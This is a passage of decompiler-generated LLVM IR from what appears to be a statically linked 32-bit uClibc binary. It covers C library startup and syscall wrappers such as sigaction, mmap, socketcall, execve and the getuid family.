  %v1_80548c9 = phi i32 [ %v2_80548d92, %dec_label_pc_80548be.lr.ph ], [ %v2_80548d9, %dec_label_pc_80548d6 ]
  %v0_80548c8 = phi i32 [ %v1_80548b5, %dec_label_pc_80548be.lr.ph ], [ %v1_80548d6, %dec_label_pc_80548d6 ]
  %v6_80548c3 = icmp ugt i32 %v1_80548c9, 14
  br i1 %v6_80548c3, label %dec_label_pc_80548d6, label %dec_label_pc_80548c5

dec_label_pc_80548c5:                             ; preds = %dec_label_pc_80548be
  %v0_80548c5 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_80548c5, i32* %stack_var_-160, align 4
  store i32 %v0_80548c8, i32* %stack_var_-168, align 4
  %v2_80548c9 = mul i32 %v1_80548c9, 8
  %v4_80548c9 = add i32 %v3_80548c9, %v2_80548c9
  %v3_80548ce = inttoptr i32 %v4_80548c9 to i16*
  %v4_80548ce = call i32 @memcpy(i16* %v3_80548ce, i32 %v0_80548c8, i32 8)
  %v0_80548d6.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80548d6

dec_label_pc_80548d6:                             ; preds = %dec_label_pc_80548be, %dec_label_pc_80548c5
  %v0_80548d6 = phi i32 [ %v0_80548c8, %dec_label_pc_80548be ], [ %v0_80548d6.pre, %dec_label_pc_80548c5 ]
  %v1_80548d6 = add i32 %v0_80548d6, 8
  store i32 %v1_80548d6, i32* @ebx, align 4
  %v1_80548d9 = inttoptr i32 %v1_80548d6 to i32*
  %v2_80548d9 = load i32, i32* %v1_80548d9, align 4
  %v3_80548d9 = icmp eq i32 %v2_80548d9, 0
  %v1_80548dc = icmp eq i1 %v3_80548d9, false
  br i1 %v1_80548dc, label %dec_label_pc_80548be, label %dec_label_pc_80548de

dec_label_pc_80548de:                             ; preds = %dec_label_pc_80548d6, %dec_label_pc_80548d9.preheader
  store i32 %v2_80548a0, i32* @eax, align 4
  %v0_80548e2 = call i32 @_dl_aux_init()
  store i32 %v0_80548e2, i32* @eax, align 4
  %v0_80548e7 = call i32 @__GI___uClibc_init()
  %v1_80548f0 = icmp eq i32 %tmp26, 0
  %v1_80548f2 = icmp eq i1 %v1_80548f0, false
  br i1 %v1_80548f2, label %dec_label_pc_80548f8, label %dec_label_pc_80548f4

dec_label_pc_80548f4:                             ; preds = %dec_label_pc_80548de
  %v1_80548f4 = and i32 %tmp26, -65536
  %v2_80548f4 = or i32 %v1_80548f4, 4096
  br label %dec_label_pc_80548f8

dec_label_pc_80548f8:                             ; preds = %dec_label_pc_80548de, %dec_label_pc_80548f4
  %v0_80548f8 = phi i32 [ %tmp26, %dec_label_pc_80548de ], [ %v2_80548f4, %dec_label_pc_80548f4 ]
  store i32 %v0_80548f8, i32* @global_var_8061770.465, align 16
  %v13_80548fd = icmp eq i32 %tmp25, -1
  %v1_8054902 = icmp eq i1 %v13_80548fd, false
  br i1 %v1_8054902, label %dec_label_pc_805492d, label %dec_label_pc_8054904

dec_label_pc_8054904:                             ; preds = %dec_label_pc_80548f8
  %v0_8054904 = call i32 @getuid()
  store i32 %v0_8054904, i32* @ebx, align 4
  %v0_805490b = call i32 @geteuid()
  %v0_8054910 = load i32, i32* @ebx, align 4
  %v12_8054910 = icmp eq i32 %v0_8054910, %v0_805490b
  %v1_8054912 = icmp eq i1 %v12_8054910, false
  br i1 %v1_8054912, label %dec_label_pc_8054943, label %dec_label_pc_8054914

dec_label_pc_8054914:                             ; preds = %dec_label_pc_8054904
  %v0_8054914 = call i32 @getgid()
  store i32 %v0_8054914, i32* @ebx, align 4
  %v0_805491b = call i32 @getegid()
  %v0_8054920 = load i32, i32* @ebx, align 4
  %v12_8054920 = icmp eq i32 %v0_8054920, %v0_805491b
  %v1_8054922 = icmp eq i1 %v12_8054920, false
  br i1 %v1_8054922, label %dec_label_pc_8054943, label %dec_label_pc_8054924.thread

dec_label_pc_8054924.thread:                      ; preds = %dec_label_pc_8054914
  br label %dec_label_pc_805496d

dec_label_pc_805492d:                             ; preds = %dec_label_pc_80548f8
  %v15_805492d = icmp eq i32 %tmp25, %tmp24
  %v1_8054931 = icmp eq i1 %v15_805492d, false
  br i1 %v1_8054931, label %dec_label_pc_8054943, label %dec_label_pc_8054933

dec_label_pc_8054933:                             ; preds = %dec_label_pc_805492d
  br label %dec_label_pc_8054943

dec_label_pc_8054943:                             ; preds = %dec_label_pc_8054933, %dec_label_pc_805492d, %dec_label_pc_8054914, %dec_label_pc_8054904
  store i32 131072, i32* @edx, align 4
  store i32 0, i32* @eax, align 4
  %v0_805494a = call i32 @__check_one_fd()
  store i32 131074, i32* @edx, align 4
  store i32 1, i32* @eax, align 4
  %v0_8054959 = call i32 @__check_one_fd()
  store i32 131074, i32* @edx, align 4
  store i32 2, i32* @eax, align 4
  %v0_8054968 = call i32 @__check_one_fd()
  br label %dec_label_pc_805496d

dec_label_pc_805496d:                             ; preds = %dec_label_pc_8054924.thread, %dec_label_pc_8054943
  store i32 ptrtoint (i32* @global_var_805b000.538 to i32), i32* %esi.global-to-local, align 4
  %v0_8054972 = load i32, i32* @edi, align 4
  %v1_8054972 = inttoptr i32 %v0_8054972 to i32*
  %v2_8054972 = load i32, i32* %v1_8054972, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_805b000.538 to i32), i32 -134590464), i32* %esi.global-to-local, align 4
  store i32 %v2_8054972, i32* inttoptr (i32 134591704 to i32*), align 8
  store i32 sdiv (i32 add (i32 ptrtoint (i32* @global_var_805b000.538 to i32), i32 -134590464), i32 4), i32* %esi.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 %arg5, i32* @global_var_8061774.540, align 4
  br i1 icmp ugt (i32 add (i32 ptrtoint (i32* @global_var_805b000.538 to i32), i32 -134590461), i32 6), label %dec_label_pc_8054992, label %dec_label_pc_805499e

dec_label_pc_8054992:                             ; preds = %dec_label_pc_805496d, %dec_label_pc_8054992
  %v4_805499247 = phi i32 [ %v1_8054999, %dec_label_pc_8054992 ], [ 0, %dec_label_pc_805496d ]
  store i32 ptrtoint (i32* @global_var_8054999.546 to i32), i32* %stack_var_-160, align 4
  %v5_8054992 = mul i32 %v4_805499247, 4
  %v6_8054992 = add i32 %v5_8054992, ptrtoint (i32* @global_var_805b000.538 to i32)
  %v7_8054992 = inttoptr i32 %v6_8054992 to i32*
  %v8_8054992 = load i32, i32* %v7_8054992, align 4
  call void @__pseudo_call(i32 %v8_8054992)
  %v0_8054999 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054999 = add i32 %v0_8054999, 1
  store i32 %v1_8054999, i32* %ebx.global-to-local, align 4
  %v1_805499a.pre = load i32, i32* %esi.global-to-local, align 4
  %v7_805499a = icmp ult i32 %v1_8054999, %v1_805499a.pre
  br i1 %v7_805499a, label %dec_label_pc_8054992, label %dec_label_pc_805499e

dec_label_pc_805499e:                             ; preds = %dec_label_pc_8054992, %dec_label_pc_805496d
  store i32 134564260, i32* %stack_var_-160, align 4
  call void @__pseudo_call(i32 %arg4)
  store i32 0, i32* @ebx, align 4
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805b000.538 to i32), i32 -134590464), i32 2), i32* %esi.global-to-local, align 4
  br i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805b000.538 to i32), i32 -134590464), i32 2), i32 0), label %dec_label_pc_80549b6, label %dec_label_pc_80549c2

dec_label_pc_80549b6:                             ; preds = %dec_label_pc_805499e, %dec_label_pc_80549b6
  %v4_80549b644 = phi i32 [ %v1_80549bd, %dec_label_pc_80549b6 ], [ 0, %dec_label_pc_805499e ]
  store i32 ptrtoint (i32* @global_var_80549bd.547 to i32), i32* %stack_var_-160, align 4
  %v5_80549b6 = mul i32 %v4_80549b644, 4
  %v6_80549b6 = add i32 %v5_80549b6, ptrtoint (i32* @global_var_805b000.538 to i32)
  %v7_80549b6 = inttoptr i32 %v6_80549b6 to i32*
  %v8_80549b6 = load i32, i32* %v7_80549b6, align 4
  call void @__pseudo_call(i32 %v8_80549b6)
  %v0_80549bd = load i32, i32* @ebx, align 4
  %v1_80549bd = add i32 %v0_80549bd, 1
  store i32 %v1_80549bd, i32* @ebx, align 4
  %v1_80549be.pre = load i32, i32* %esi.global-to-local, align 4
  %v7_80549be = icmp ult i32 %v1_80549bd, %v1_80549be.pre
  br i1 %v7_80549be, label %dec_label_pc_80549b6, label %dec_label_pc_80549c2

dec_label_pc_80549c2:                             ; preds = %dec_label_pc_80549b6, %dec_label_pc_805499e
  %v0_80549cb = load i32, i32* %stack_var_-160, align 4
  %v1_80549cb = call i32 @__errno_location(i32 %v0_80549cb)
  %v1_80549d0 = inttoptr i32 %v1_80549cb to i32*
  store i32 0, i32* %v1_80549d0, align 4
  %v0_80549df = call i32 @__GI___h_errno_location()
  store i32 %v0_80549df, i32* @eax, align 4
  %v1_80549e4 = inttoptr i32 %v0_80549df to i32*
  store i32 0, i32* %v1_80549e4, align 4
  %v0_80549ea = load i32, i32* @eax, align 4
  store i32 %v0_80549ea, i32* %stack_var_-160, align 4
  %v0_80549f1 = load i32, i32* @edi, align 4
  store i32 %v0_80549f1, i32* %stack_var_-168, align 4
  call void @__pseudo_call(i32 %arg1)
  %v0_8054a00 = load i32, i32* @eax, align 4
  %v1_8054a03 = call i32 @__GI_exit(i32 %v0_8054a00)
  %v0_8054a0d = load i32, i32* @ebx, align 4
  %v1_8054a0d = inttoptr i32 %v0_8054a0d to %sigcontext*
  %v2_8054a0d = call i32 @sigreturn(%sigcontext* %v1_8054a0d)
  %v0_8054a15 = load i32, i32* @ebx, align 4
  %v1_8054a15 = inttoptr i32 %v0_8054a15 to %sigcontext*
  %v2_8054a15 = call i32 @sigreturn(%sigcontext* %v1_8054a15)
  ret i32 %v2_8054a15

; uselistorder directives
  uselistorder i32 %v1_80549bd, { 1, 2, 0 }
  uselistorder i32 %v1_8054999, { 1, 2, 0 }
  uselistorder i32 %v2_80548d9, { 1, 0 }
  uselistorder i32 %v1_80548d6, { 2, 1, 0 }
  uselistorder i32 %v1_80548b5, { 0, 2, 1, 3 }
  uselistorder i32 %v0_80548b2, { 1, 0 }
  uselistorder i32* %stack_var_-160, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %stack_var_-168, { 0, 1, 3, 2 }
  uselistorder i32 (i32)* @__GI_exit, { 0, 7, 3, 1, 2, 6, 5, 4 }
  uselistorder i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805b000.538 to i32), i32 -134590464), i32 2), { 0, 2, 3, 1 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_805b000.538 to i32), i32 -134590464), { 0, 2, 1 }
  uselistorder i32 ()* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32 131072, { 2, 1, 0 }
  uselistorder i32 4096, { 22, 23, 6, 21, 17, 18, 0, 1, 7, 19, 16, 20, 13, 8, 3, 9, 14, 10, 4, 15, 11, 5, 2, 12 }
  uselistorder i32 14, { 2, 4, 3, 1, 0 }
  uselistorder label %dec_label_pc_80549b6, { 1, 0 }
  uselistorder label %dec_label_pc_8054992, { 1, 0 }
  uselistorder label %dec_label_pc_805496d, { 1, 0 }
  uselistorder label %dec_label_pc_80548f8, { 1, 0 }
  uselistorder label %dec_label_pc_80548d6, { 1, 0 }
  uselistorder label %dec_label_pc_80548be, { 1, 0 }
  uselistorder label %dec_label_pc_805489b, { 1, 0 }
}

define i32 @__libc_sigaction(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg2 to i32
  %stack_var_-276 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %v0_8054a17 = load i32, i32* @esi, align 4
  %v0_8054a18 = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_8054a2d = icmp eq i32* %arg2, null
  br i1 %v1_8054a2d, label %dec_label_pc_8054a80, label %dec_label_pc_8054a31

dec_label_pc_8054a31:                             ; preds = %entry
  %v2_8054a31 = load i32, i32* %arg2, align 4
  store i32 %v2_8054a31, i32* %stack_var_-148, align 4
  %v1_8054a3a = add i32 %tmp11, 4
  %v3_8054a4c = bitcast i32* %stack_var_-136 to i16*
  %v4_8054a4c = call i32 @memcpy(i16* %v3_8054a4c, i32 %v1_8054a3a, i32 128)
  %v1_8054a51 = add i32 %tmp11, 132
  %v2_8054a6b = inttoptr i32 %v1_8054a51 to i8*
  %v3_8054a6b = load i8, i8* %v2_8054a6b, align 1
  %v4_8054a6b = and i8 %v3_8054a6b, 4
  %v5_8054a6b = icmp eq i8 %v4_8054a6b, 0
  %v1_8054a72 = icmp eq i1 %v5_8054a6b, false
  br i1 %v1_8054a72, label %dec_label_pc_8054a80, label %dec_label_pc_8054a74

dec_label_pc_8054a74:                             ; preds = %dec_label_pc_8054a31
  br label %dec_label_pc_8054a80

dec_label_pc_8054a80:                             ; preds = %dec_label_pc_8054a74, %dec_label_pc_8054a31, %entry
  %v1_8054a82 = icmp eq i32 %arg3, 0
  br i1 %v1_8054a82, label %dec_label_pc_8054a8a, label %dec_label_pc_8054a86

dec_label_pc_8054a86:                             ; preds = %dec_label_pc_8054a80
  %v2_8054a86 = ptrtoint i32* %stack_var_-288 to i32
  br label %dec_label_pc_8054a8a

dec_label_pc_8054a8a:                             ; preds = %dec_label_pc_8054a80, %dec_label_pc_8054a86
  %v0_8054a99 = phi i32 [ 0, %dec_label_pc_8054a80 ], [ %v2_8054a86, %dec_label_pc_8054a86 ]
  br i1 %v1_8054a2d, label %dec_label_pc_8054a97, label %dec_label_pc_8054a90

dec_label_pc_8054a90:                             ; preds = %dec_label_pc_8054a8a
  %phitmp = bitcast i32* %stack_var_-148 to %sigaction*
  br label %dec_label_pc_8054a97

dec_label_pc_8054a97:                             ; preds = %dec_label_pc_8054a8a, %dec_label_pc_8054a90
  %v0_8054a9a = phi %sigaction* [ null, %dec_label_pc_8054a8a ], [ %phitmp, %dec_label_pc_8054a90 ]
  %v5_8054aa2 = call i32 @__syscall_rt_sigaction(i32 %arg1, %sigaction* %v0_8054a9a, i32 %v0_8054a99, i32 8)
  store i32 %v5_8054aa2, i32* %ebx.global-to-local, align 4
  br i1 %v1_8054a82, label %dec_label_pc_8054ae5, label %dec_label_pc_8054ab0

dec_label_pc_8054ab0:                             ; preds = %dec_label_pc_8054a97
  %v2_8054ab0 = icmp slt i32 %v5_8054aa2, 0
  br i1 %v2_8054ab0, label %dec_label_pc_8054ae5, label %dec_label_pc_8054ab4

dec_label_pc_8054ab4:                             ; preds = %dec_label_pc_8054ab0
  %v3_8054ab4 = load i32, i32* %stack_var_-288, align 4
  %v2_8054ab8 = inttoptr i32 %arg3 to i32*
  store i32 %v3_8054ab4, i32* %v2_8054ab8, align 4
  %v2_8054ac0 = ptrtoint i32* %stack_var_-276 to i32
  %v1_8054ac5 = add i32 %arg3, 4
  %v3_8054ac9 = inttoptr i32 %v1_8054ac5 to i16*
  %v4_8054ac9 = call i32 @memcpy(i16* %v3_8054ac9, i32 %v2_8054ac0, i32 128)
  %v2_8054ad2 = add i32 %arg3, 132
  %v3_8054ad2 = inttoptr i32 %v2_8054ad2 to i32*
  %v2_8054adf = add i32 %arg3, 136
  %v3_8054adf = inttoptr i32 %v2_8054adf to i32*
  %v0_8054ae5.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054ae5

dec_label_pc_8054ae5:                             ; preds = %dec_label_pc_8054ab0, %dec_label_pc_8054a97, %dec_label_pc_8054ab4
  %v0_8054ae5 = phi i32 [ %v5_8054aa2, %dec_label_pc_8054ab0 ], [ %v5_8054aa2, %dec_label_pc_8054a97 ], [ %v0_8054ae5.pre, %dec_label_pc_8054ab4 ]
  store i32 %v0_8054a18, i32* @ebx, align 4
  store i32 %v0_8054a17, i32* @esi, align 4
  ret i32 %v0_8054ae5

; uselistorder directives
  uselistorder i1 %v1_8054a82, { 1, 0 }
  uselistorder i1 %v1_8054a2d, { 1, 0 }
  uselistorder i32 %tmp11, { 1, 0, 2 }
  uselistorder i32* null, { 3, 7, 4, 8, 9, 10, 0, 11, 12, 1, 13, 14, 2, 15, 16, 17, 18, 19, 20, 21, 22, 5, 6 }
  uselistorder i32 %arg3, { 2, 1, 3, 4, 0, 5 }
  uselistorder label %dec_label_pc_8054ae5, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8054a97, { 1, 0 }
  uselistorder label %dec_label_pc_8054a8a, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %v0_8054af3 = load i32, i32* @eax, align 4
  %v1_8054af5 = sub i32 0, %v0_8054af3
  %v1_8054af7 = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v2_8054afc = inttoptr i32 %v1_8054af7 to i32*
  store i32 %v1_8054af5, i32* %v2_8054afc, align 4
  ret i32 -1
}

define i32 @mmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %stack_var_4 = alloca i32, align 4
  %v0_8054b08 = load i32, i32* @ebx, align 4
  %v2_8054b0f = ptrtoint i32* %stack_var_4 to i32
  store i32 %v2_8054b0f, i32* @ebx, align 4
  %v8_8054b13 = call i32 @mmap(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v0_8054b08, i32* @ebx, align 4
  %v3_8054b1c = icmp ugt i32 %v8_8054b13, -4096
  call void @__pseudo_cond_branch(i1 %v3_8054b1c, i32 134564592)
  ret i32 %v8_8054b13

; uselistorder directives
  uselistorder i32 %v8_8054b13, { 1, 0 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 1, 0 }
  uselistorder i32 134564592, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32)* @mmap, { 2, 1, 0 }
}

define i32 @__socketcall(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8054b24 = load i32, i32* @ebx, align 4
  store i32 %v0_8054b24, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_8054b37 = call i32 @int80_syscall(i32 102)
  store i32 %v1_8054b37, i32* %ebx.global-to-local, align 4
  %tmp8 = icmp ult i32 %v1_8054b37, -4095
  br i1 %tmp8, label %dec_label_pc_8054b50, label %dec_label_pc_8054b44

dec_label_pc_8054b44:                             ; preds = %entry
  %v0_8054b44 = load i32, i32* %stack_var_-4, align 4
  %v1_8054b44 = call i32 @__errno_location(i32 %v0_8054b44)
  %v0_8054b49 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054b49 = sub i32 0, %v0_8054b49
  %v2_8054b4b = inttoptr i32 %v1_8054b44 to i32*
  store i32 %v1_8054b49, i32* %v2_8054b4b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054b50

dec_label_pc_8054b50:                             ; preds = %entry, %dec_label_pc_8054b44
  %v0_8054b50 = phi i32 [ %v1_8054b37, %entry ], [ -1, %dec_label_pc_8054b44 ]
  %v2_8054b52 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8054b52, i32* @edx, align 4
  %v2_8054b54 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8054b54, i32* @ebx, align 4
  ret i32 %v0_8054b50

; uselistorder directives
  uselistorder i32 %v1_8054b37, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 102, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8054b50, { 1, 0 }
}

define i32 @__syscall_rt_sigaction(i32 %arg1, %sigaction* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = inttoptr i32 %arg3 to %sigaction*
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8054b59 = load i32, i32* @esi, align 4
  store i32 %v0_8054b59, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_8054b6d = load i32, i32* @ebx, align 4
  %v7_8054b75 = call i32 @sigaction(i32 %arg1, %sigaction* %arg2, %sigaction* %tmp5)
  store i32 %v7_8054b75, i32* %esi.global-to-local, align 4
  %tmp13 = icmp ult i32 %v7_8054b75, -4095
  br i1 %tmp13, label %dec_label_pc_8054b8d, label %dec_label_pc_8054b81

dec_label_pc_8054b81:                             ; preds = %entry
  %v1_8054b81 = call i32 @__errno_location(i32 %v0_8054b6d)
  %v0_8054b86 = load i32, i32* %esi.global-to-local, align 4
  %v1_8054b86 = sub i32 0, %v0_8054b86
  %v2_8054b88 = inttoptr i32 %v1_8054b81 to i32*
  store i32 %v1_8054b86, i32* %v2_8054b88, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8054b8d

dec_label_pc_8054b8d:                             ; preds = %entry, %dec_label_pc_8054b81
  %v0_8054b8d = phi i32 [ %v7_8054b75, %entry ], [ -1, %dec_label_pc_8054b81 ]
  %v2_8054b8f = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8054b8f, i32* @edx, align 4
  %v2_8054b90 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8054b90, i32* @esi, align 4
  ret i32 %v0_8054b8d

; uselistorder directives
  uselistorder i32 %v7_8054b75, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8054b8d, { 1, 0 }
}

define i32 @__GI_clock_getres(i32 %arg1, %timespec* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8054b94 = load i32, i32* @ebx, align 4
  store i32 %v0_8054b94, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v4_8054ba7 = call i32 @clock_getres(i32 %arg1, %timespec* %arg2)
  store i32 %v4_8054ba7, i32* %ebx.global-to-local, align 4
  %tmp9 = icmp ult i32 %v4_8054ba7, -4095
  br i1 %tmp9, label %dec_label_pc_8054bc0, label %dec_label_pc_8054bb4

dec_label_pc_8054bb4:                             ; preds = %entry
  %v0_8054bb4 = load i32, i32* %stack_var_-4, align 4
  %v1_8054bb4 = call i32 @__errno_location(i32 %v0_8054bb4)
  %v0_8054bb9 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054bb9 = sub i32 0, %v0_8054bb9
  %v2_8054bbb = inttoptr i32 %v1_8054bb4 to i32*
  store i32 %v1_8054bb9, i32* %v2_8054bbb, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054bc0

dec_label_pc_8054bc0:                             ; preds = %entry, %dec_label_pc_8054bb4
  %v0_8054bc0 = phi i32 [ %v4_8054ba7, %entry ], [ -1, %dec_label_pc_8054bb4 ]
  %v2_8054bc2 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8054bc2, i32* @edx, align 4
  %v2_8054bc4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8054bc4, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8054bc0

; uselistorder directives
  uselistorder i32 %v4_8054ba7, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8054bc0, { 1, 0 }
}

define i32 @__GI_execve(i8* %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp = call i8* @__decompiler_undefined_function_2()
  %tmp5 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8054bc8 = load i32, i32* @edi, align 4
  store i32 %v0_8054bc8, i32* %stack_var_-4, align 4
  %v4_8054bcc = ptrtoint i8* %arg1 to i32
  store i32 %v4_8054bcc, i32* %edi.global-to-local, align 4
  %v0_8054bd8 = load i32, i32* @ebx, align 4
  %v5_8054be0 = insertvalue [1 x i8*] undef, i8* %tmp5, 0
  %v8_8054be0 = insertvalue [1 x i8*] undef, i8* %tmp, 0
  %v9_8054be0 = call i32 @execve(i8* %arg1, [1 x i8*] %v5_8054be0, [1 x i8*] %v8_8054be0)
  store i32 %v9_8054be0, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v9_8054be0, -4095
  br i1 %tmp12, label %dec_label_pc_8054bf8, label %dec_label_pc_8054bec

dec_label_pc_8054bec:                             ; preds = %entry
  %v1_8054bec = call i32 @__errno_location(i32 %v0_8054bd8)
  %v0_8054bf1 = load i32, i32* %edi.global-to-local, align 4
  %v1_8054bf1 = sub i32 0, %v0_8054bf1
  %v2_8054bf3 = inttoptr i32 %v1_8054bec to i32*
  store i32 %v1_8054bf1, i32* %v2_8054bf3, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8054bf8

dec_label_pc_8054bf8:                             ; preds = %entry, %dec_label_pc_8054bec
  %v0_8054bf8 = phi i32 [ %v9_8054be0, %entry ], [ -1, %dec_label_pc_8054bec ]
  %v2_8054bfa = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8054bfa, i32* @edx, align 4
  %v2_8054bfc = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8054bfc, i32* %edi.global-to-local, align 4
  ret i32 %v0_8054bf8

; uselistorder directives
  uselistorder i32 %v9_8054be0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8054bf8, { 1, 0 }
}

define i32 @getegid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8054c00 = load i32, i32* @ebx, align 4
  store i32 %v0_8054c00, i32* %stack_var_-4, align 4
  %v1_8054c09 = call i32 @int80_syscall(i32 202)
  store i32 %v1_8054c09, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_8054c09, -4095
  br i1 %tmp6, label %dec_label_pc_8054c20, label %dec_label_pc_8054c14

dec_label_pc_8054c14:                             ; preds = %entry
  %v0_8054c14 = load i32, i32* %stack_var_-4, align 4
  %v1_8054c14 = call i32 @__errno_location(i32 %v0_8054c14)
  %v0_8054c19 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054c19 = sub i32 0, %v0_8054c19
  %v2_8054c1b = inttoptr i32 %v1_8054c14 to i32*
  store i32 %v1_8054c19, i32* %v2_8054c1b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054c20

dec_label_pc_8054c20:                             ; preds = %entry, %dec_label_pc_8054c14
  %v0_8054c20 = phi i32 [ %v1_8054c09, %entry ], [ -1, %dec_label_pc_8054c14 ]
  %v2_8054c24 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8054c24, i32* @ebx, align 4
  ret i32 %v0_8054c20

; uselistorder directives
  uselistorder i32 %v1_8054c09, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 202, { 1, 0 }
  uselistorder label %dec_label_pc_8054c20, { 1, 0 }
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8054c28 = load i32, i32* @ebx, align 4
  store i32 %v0_8054c28, i32* %stack_var_-4, align 4
  %v1_8054c31 = call i32 @int80_syscall(i32 201)
  store i32 %v1_8054c31, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_8054c31, -4095
  br i1 %tmp6, label %dec_label_pc_8054c48, label %dec_label_pc_8054c3c

dec_label_pc_8054c3c:                             ; preds = %entry
  %v0_8054c3c = load i32, i32* %stack_var_-4, align 4
  %v1_8054c3c = call i32 @__errno_location(i32 %v0_8054c3c)
  %v0_8054c41 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054c41 = sub i32 0, %v0_8054c41
  %v2_8054c43 = inttoptr i32 %v1_8054c3c to i32*
  store i32 %v1_8054c41, i32* %v2_8054c43, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054c48

dec_label_pc_8054c48:                             ; preds = %entry, %dec_label_pc_8054c3c
  %v0_8054c48 = phi i32 [ %v1_8054c31, %entry ], [ -1, %dec_label_pc_8054c3c ]
  %v2_8054c4c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8054c4c, i32* @ebx, align 4
  ret i32 %v0_8054c48

; uselistorder directives
  uselistorder i32 %v1_8054c31, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 201, { 1, 0 }
  uselistorder label %dec_label_pc_8054c48, { 1, 0 }
}

define i32 @getgid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8054c50 = load i32, i32* @ebx, align 4
  store i32 %v0_8054c50, i32* %stack_var_-4, align 4
  %v1_8054c59 = call i32 @int80_syscall(i32 200)
  store i32 %v1_8054c59, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_8054c59, -4095
  br i1 %tmp6, label %dec_label_pc_8054c70, label %dec_label_pc_8054c64

